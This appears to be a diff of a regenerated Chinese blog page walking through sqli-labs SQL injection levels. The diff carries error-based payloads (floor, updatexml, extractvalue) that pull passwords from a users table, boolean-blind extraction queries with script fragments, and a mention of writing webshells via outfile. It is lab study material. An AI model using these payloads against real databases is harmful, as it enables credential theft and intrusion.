@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -311,7 +311,7 @@
 <p>不在打印出所查询到的内容，所以是盲注，但是这关没有关闭报错回显，所以可以通过报错注入</p>
 <p><strong>报错注入</strong></p>
 <p><span style="background-color:yellow"><strong>(1). 通过floor报错</strong></span></p>
-<p>and (select 1 from (select count(<em>),concat((payload) from users limit 0,1),floor (rand(0)</em>2))x from information_schema.tables group by x)a)</p>
+<p>and (select 1 from (select count(*),concat((payload) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)</p>
 <p>其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</p>
 <p><span style="background-color:yellow"><strong>(2). 通过updatexml报错</strong></span></p>
 <p>and updatexml(1,payload,1)</p>
@@ -329,13 +329,13 @@
 
 
 
-<h2 id="0x4-爆内容"><a href="#0x4-爆内容" class="headerlink" title="0x4 爆内容"></a>0x4 爆内容</h2><div class="hljs"><pre><code class="hljs mysql">?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+</code></pre></div>
+<h2 id="0x4-爆内容"><a href="#0x4-爆内容" class="headerlink" title="0x4 爆内容"></a>0x4 爆内容</h2><div class="hljs"><pre><code class="hljs mysql">?id=1&#x27; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+</code></pre></div>
 
 <p>后面的内容可以通过改变limit后的第一个参数查看</p>
 <h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><p>与level5很像</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223612822.png" srcset="/img/loading.gif" alt="image-20210130223612822"></p>
 <p>但是这里是用 “包裹参数，所以只需要将上面的注入语句中的 ‘ 改为 “即可</p>
-<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p>提交id=1，出现提示</p>
+<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p>提交id&#x3D;1，出现提示</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131230645205.png" srcset="/img/loading.gif" alt="image-20210131230645205"></p>
 <p>需要使用outfile函数</p>
 <p>在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个</p>
@@ -370,7 +370,7 @@
 <div class="hljs"><pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre></div>
 
 <p>最后爆出的表名如下</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201121435085.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201121435085.png" srcset="/img/loading.gif"></p>
 <h2 id="0x3-爆出列名"><a href="#0x3-爆出列名" class="headerlink" title="0x3 爆出列名"></a>0x3 爆出列名</h2><div class="hljs"><pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre></div>
 
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201140521465.png" srcset="/img/loading.gif" alt="image-20210201140521465"></p>
@@ -403,8 +403,8 @@ t = <span class="hljs-string">&quot;&quot;</span>
         mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
     <span class="hljs-comment"># print(mid)</span>
     flag = flag + <span class="hljs-built_in">chr</span>(mid)
-    print(flag)
-print(flag)</code></pre></div>
+    <span class="hljs-built_in">print</span>(flag)
+<span class="hljs-built_in">print</span>(flag)</code></pre></div>
 
 
 
@@ -442,8 +442,8 @@ flag = <span class="hljs-string">&quot;&quot;</span>
         mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
 
     flag = flag + <span class="hljs-built_in">chr</span>(mid)
-    print(flag)
-print(flag)</code></pre></div>
+    <span class="hljs-built_in">print</span>(flag)
+<span class="hljs-built_in">print</span>(flag)</code></pre></div>
 
 
 
@@ -476,8 +476,8 @@ flag = <span class="hljs-string">&quot;&quot;</span>
         mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
 
     flag = flag + <span class="hljs-built_in">chr</span>(mid)
-    print(flag)
-print(flag)</code></pre></div>
+    <span class="hljs-built_in">print</span>(flag)
+<span class="hljs-built_in">print</span>(flag)</code></pre></div>
 
 
             </div>
